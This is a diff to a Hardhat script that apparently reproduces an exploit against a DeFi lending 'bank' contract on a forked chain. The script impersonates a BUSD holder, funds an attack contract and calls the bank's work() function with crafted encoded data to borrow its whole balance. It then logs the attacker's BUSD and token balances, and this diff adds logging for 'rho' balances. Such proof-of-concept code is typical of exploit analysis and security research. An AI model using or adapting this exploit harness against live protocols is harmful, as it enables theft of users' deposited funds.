@@ -21,6 +21,7 @@ async function main() {
     });
     const signer = await hre.ethers.getSigner(BUSD_HOLDER)
     const IERC20 = await hre.ethers.getContractAt("contracts/attack.sol:IERC20", BUSD, signer);
+    //const IRHO = await hre.ethers.getContractAt("contracts/attack.sol:IRhoToken", BUSD, signer);
     let amount = await IERC20.balanceOf(BUSD_HOLDER);
     let tx = await IERC20.transfer(hack.address, amount);
     console.log('Transfer %s BUSD from %s to %s', amount, BUSD_HOLDER, hack.address);
@@ -30,7 +31,7 @@ async function main() {
     const IBANK = await hre.ethers.getContractAt("contracts/attack.sol:IBANK", BANK_ADDR, signer);
 
     let data = hre.ethers.utils.defaultAbiCoder.encode(['address', 'uint', 'uint', 'address' ,'uint'], [STRATEGY, 0x40, 0x40 ,pairAddr, 2]);
-    console.log("data: ", data);
+    //console.log("data: ", data);
 
     let borrowAmount = await IERC20.balanceOf(BANK_ADDR);
     await IBANK.work(0, 15, borrowAmount, data);
@@ -40,10 +41,14 @@ async function main() {
     let after = await hack.BUSDBalanceAfter();
     let Mbefore = await hack.Mbefore();
     let Mafter = await hack.Mafter();
+    let rhoBefore = await hack.rhoBefore();
+    let rhoAfter = await hack.rhoAfter()
     console.log("attacker BUSD before: ", before);
     console.log("attacker BUSD after:  ", after);
     console.log("attacker Mbefore: ", Mbefore);
     console.log("attacker Mafter:  ", Mafter);
+    console.log("attacker rho before: ", rhoBefore);
+    console.log("attacker rho after:  ", rhoAfter);
 
 }
 
